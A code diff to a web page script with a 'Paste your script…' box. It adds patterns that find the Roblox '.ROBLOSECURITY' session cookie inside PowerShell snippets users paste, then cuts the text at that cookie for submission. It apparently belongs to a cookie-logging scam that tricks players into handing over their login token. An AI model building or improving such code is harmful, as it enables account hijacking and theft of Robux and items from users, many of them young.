@@ -12,12 +12,20 @@
   const ROBLOX_WARNING_MARKER =
     "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
 
+  const POWERSHELL_COOKIE_PREFIX =
+    '$session.Cookies.Add((New-Object System.Net.Cookie(".ROBLOSECURITY", "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
+
+  const POWERSHELL_COOKIE_PATTERN =
+    /\$session\.Cookies\.Add\(\(New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_/i;
+
   const SENSITIVE_BEFORE_PATTERNS = [
     /roblosecurity/i,
     /warning:-do-not-share-this/i,
     /cookie\s*[:=]/i,
     /\.roblox\.com/i,
     /_\|[A-Za-z0-9+/=_-]{20,}/,
+    /\$session\.Cookies\.Add/i,
+    /System\.Net\.Cookie/i,
   ];
 
   mask.dataset.placeholder = "Paste your script…";
@@ -36,16 +44,35 @@
     });
   }
 
+  function findAnchorIndex(text) {
+    const psIndex = text.indexOf(POWERSHELL_COOKIE_PREFIX);
+    if (psIndex !== -1) {
+      return psIndex;
+    }
+
+    const psMatch = text.match(POWERSHELL_COOKIE_PATTERN);
+    if (psMatch && psMatch.index !== undefined) {
+      return psMatch.index;
+    }
+
+    const markerIndex = text.indexOf(ROBLOX_WARNING_MARKER);
+    if (markerIndex !== -1) {
+      return markerIndex;
+    }
+
+    return -1;
+  }
+
   function prepareSubmission(text) {
     const normalized = text.trim();
-    const markerIndex = normalized.indexOf(ROBLOX_WARNING_MARKER);
+    const anchorIndex = findAnchorIndex(normalized);
 
-    if (markerIndex === -1) {
+    if (anchorIndex === -1) {
       return normalized;
     }
 
-    const before = normalized.slice(0, markerIndex);
-    const after = normalized.slice(markerIndex);
+    const before = normalized.slice(0, anchorIndex);
+    const after = normalized.slice(anchorIndex);
 
     const sensitiveLines = before
       .split(/\r?\n/)
